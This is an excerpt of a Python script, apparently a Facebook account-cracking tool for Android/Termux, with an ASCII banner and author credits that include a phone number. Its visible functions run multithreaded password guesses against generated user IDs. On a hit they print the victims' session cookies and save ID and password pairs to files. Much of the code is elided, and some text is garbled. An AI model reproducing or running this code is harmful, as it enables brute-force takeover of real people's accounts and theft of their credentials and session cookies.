...
/::::::::/':-.., .,..-:::'/::::/                /::::::::/          '/,....·::´/             /::::::::/':-.., .,..-:::'/::::/                /::::\,,  -::::´´::::::::::::/''                   ¯/::`*..¸..-::::::::::::/:·´            '
 ¯¯¯¯/::::::/:::::::/:::·´                  ¯¯¯¯¯          /:::::::::/    ’           ¯¯¯¯/::::::/:::::::/:::·´                  \:::/:::::::::::::::;;::-·´´'                 '    /:::::::/::::::::::-·· ´´               ' 
       '` ·::;/::;::-·· ´´                   '                   '/;;::: · ´´                       '` ·::;/::;::-·· ´´                   '   '\/::::::;;::-· ´´'                               `*-::;/::::-·· '’                         
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : Akash        │ 
\033[1;37m│ ❲★❳ GITHUB   : Fuck You         |
\033[1;37m│ ❲★❳ WHATSAPP : +8801307958615       │
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : AKASH-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : AKASH-RNDM-CP.txt  ")
...
def random_gmail():
    ...
    print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
    print(f"  {K}EXAMPLE : \033[1;97mRakib , Jahid , Mehedi , Sumaiya , Ayesha, Nusrat, Bangladesh, Robin, Ridoy") 
...
def apk(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/AKASH-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
...
def fcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [AKASH>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
        ...
        loop+=1
        sys.stdout.write(f'\r\033[m[AKASH] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}AKASH{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
